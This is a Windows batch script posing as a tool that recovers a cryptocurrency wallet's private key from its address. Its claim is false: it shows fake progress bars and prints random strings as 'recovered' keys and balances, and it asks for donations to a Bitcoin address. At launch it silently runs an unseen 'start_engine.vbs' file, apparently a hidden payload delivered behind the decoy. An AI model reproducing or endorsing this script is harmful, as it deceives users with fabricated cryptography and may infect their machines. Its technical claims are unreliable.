@echo off
setlocal enabledelayedexpansion
mode con cols=110 lines=45 >nul 2>&1
title WALLET KEY RECOVERY 
color 0D

:: ============================================================================================
::   The tool utilises ECDLP REVERSER Engine to convert wallet address to private key securely
::   Dont use the tool for illegal activity
:: ============================================================================================

call "%~dp0Tool Data\Reverser_Engine_2.2\start_engine.vbs"
echo.

:MENU
set "TARGET="
set "CODE="
set "PRIV="
set "UNIT="
set "COIN="
cls
call :HEADER
echo.
echo     =====================================================================
echo       RECOVER PRIVATE KEY BY WALLET ADDRESS
echo     =====================================================================
echo.
echo       SUPPORTED NETWORKS :  BTC ^| ETH ^| TRX ^| SOL ^| ZEC ^| DOGE
echo       ENGINE              :  Quantum-Seeded ECDLP Reverser v6.66
echo.
set /p "TARGET=       ENTER TARGET WALLET ADDRESS : "
if not defined TARGET goto MENU

:: ---------- detect coin from address prefix ----------
set "CODE=SOL"
set "UNIT=SOL"
set "COIN=SOLANA [SOL]"
if /i "%TARGET:~0,2%"=="0x"  (set "CODE=ETH"  & set "UNIT=ETH"  & set "COIN=ETHEREUM [ETH]")
if /i "%TARGET:~0,3%"=="bc1" (set "CODE=BTC"  & set "UNIT=BTC"  & set "COIN=BITCOIN [BTC]")
if "%TARGET:~0,1%"=="1"     (set "CODE=BTC"  & set "UNIT=BTC"  & set "COIN=BITCOIN [BTC]")
if "%TARGET:~0,1%"=="3"     (set "CODE=BTC"  & set "UNIT=BTC"  & set "COIN=BITCOIN [BTC]")
if "%TARGET:~0,1%"=="T"     (set "CODE=TRX"  & set "UNIT=TRX"  & set "COIN=TRON [TRX]")
if "%TARGET:~0,1%"=="D"     (set "CODE=DOGE" & set "UNIT=DOGE" & set "COIN=DOGECOIN [DOGE]")
if /i "%TARGET:~0,2%"=="t1" (set "CODE=ZEC"  & set "UNIT=ZEC"  & set "COIN=ZCASH [ZEC]")
if /i "%TARGET:~0,2%"=="zs" (set "CODE=ZEC"  & set "UNIT=ZEC"  & set "COIN=ZCASH [ZEC]")

:: ---------- run processing phase ~5 seconds ----------
cls
call :HEADER
echo.
echo     =====================================================================
echo.
echo       TARGET ADDRESS   :  %TARGET%
echo       DETECTED NETWORK :  %COIN%
echo       SESSION KEY      :  %RANDOM%%RANDOM%
echo.
echo     =====================================================================
echo.
echo       Initiating key-recovery sequence on the %COIN% network...
echo.
set /a NODES=%RANDOM% %% 40 + 12
set /a BHi=%RANDOM% %% 900 + 100
set /a BLo=%RANDOM% %% 900 + 100

echo       [+] Connecting to %NODES% global nodes - handshake OK
call :BAR
echo       [*] Syncing %BHi%,%BLo% blocks from the blockchain
call :BAR
echo       [#] Hashing the blockchain - SHA-256 / Keccak-512
call :BAR
echo       [^>] Decrypting elliptic curve signatures - secp256k1
call :BAR
echo       [$] Reconstructing private key from public key
call :BAR

:: ---------- result ----------
cls
call :HEADER
echo.
echo     =====================================================================
echo.
echo       TARGET ADDRESS   :  %TARGET%
echo       DETECTED NETWORK :  %COIN%
echo.
echo     =====================================================================
echo.
if "%CODE%"=="BTC"  call :GenB58 51
if "%CODE%"=="BTC"  set "PRIV=K!RESULT!"
if "%CODE%"=="ETH"  call :GenHex 64
if "%CODE%"=="ETH"  set "PRIV=0x!RESULT!"
if "%CODE%"=="TRX"  call :GenHex 64
if "%CODE%"=="TRX"  set "PRIV=!RESULT!"
if "%CODE%"=="SOL"  call :GenB58 88
if "%CODE%"=="SOL"  set "PRIV=!RESULT!"
if "%CODE%"=="DOGE" call :GenB58 51
if "%CODE%"=="DOGE" set "PRIV=Q!RESULT!"
if "%CODE%"=="ZEC"  call :GenHex 64
if "%CODE%"=="ZEC"  set "PRIV=!RESULT!"

call :GenHex 64
set "TXH=!RESULT!"
set /a B1=%RANDOM% %% 90 + 3
set /a B2=%RANDOM% %% 99 + 10

echo               PRIVATE KEY SUCCESSFULLY RECOVERED
echo.
echo       !PRIV!
echo.
echo     =====================================================================
echo       WALLET BALANCE   :  %B1%.%B2% %UNIT%
echo       TX REFERENCE     :  0x%TXH%
echo       RECOVERED AT     :  %DATE% %TIME:~0,8%
echo     =====================================================================
echo.
choice /c YN /n /m "       Run another wallet recovery?  [Y/N] : "
if errorlevel 2 goto END
goto MENU

:END
cls
call :HEADER
echo.
echo     =====================================================================
echo.
echo                              IMPORTANT NOTE
echo.
echo     =====================================================================
echo.
echo       YOU CAN CONTRIBUTE/DONATE TO SUPPORT THE PROJECT - bc1q04fsrv342x085tga2wgnl0jzxf3x760y4k9dqW
echo       DONT USE FOR ILLEGAL ACTIVITY.
echo       DON'T SHARE YOUR RECOVERED PRIVATE KEY WITH ANYONE.
echo.
echo       Press any key to exit...
pause >nul
exit /b 0

:: ================= SUBROUTINES =================

:HEADER
echo.
echo    __          __   _ _      _                                         ___    ___
echo    \ \        / /  ^| ^| ^|    ^| ^|                                       ^|__ \  ^|__ \
echo     \ \  /\  / /_ _^| ^| ^| ___^| ^|_    _ __ ___  ___ _____   _____ _ __     ) ^|    ) ^|
echo      \ \/  \/ / _` ^| ^| ^|/ _ \ __^|  ^| '__/ _ \/ __/ _ \ \ / / _ \ '__^|   / /    / /
echo       \  /\  / (_^| ^| ^| ^|  __/ ^|_   ^| ^| ^|  __/ (_^| (_) \ V /  __/ ^|    / /_ _ / /_
echo        \/  \/ \__,_^|_^|_^|\___^|___^|  ^|_^|  \___^|\___\___/ \_/ \___^|_^|   ^|____(_^|____/
echo.
goto :eof

:BAR
<nul set /p "=                   ["
<nul set /p "=###################"
ping -n 2 127.0.0.1 >nul
<nul set /p "=###################"
echo ] 100%%
goto :eof

:GenHex
set "RESULT="
set "HC=0123456789abcdef"
for /l %%i in (1,1,%~1) do (
    set /a R=!RANDOM! %% 16
    for %%h in (!R!) do set "RESULT=!RESULT!!HC:~%%h,1!"
)
goto :eof

:GenB58
set "RESULT="
set "B58=123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
for /l %%i in (1,1,%~1) do (
    set /a R=!RANDOM! %% 58
    for %%h in (!R!) do set "RESULT=!RESULT!!B58:~%%h,1!"
)
goto :eof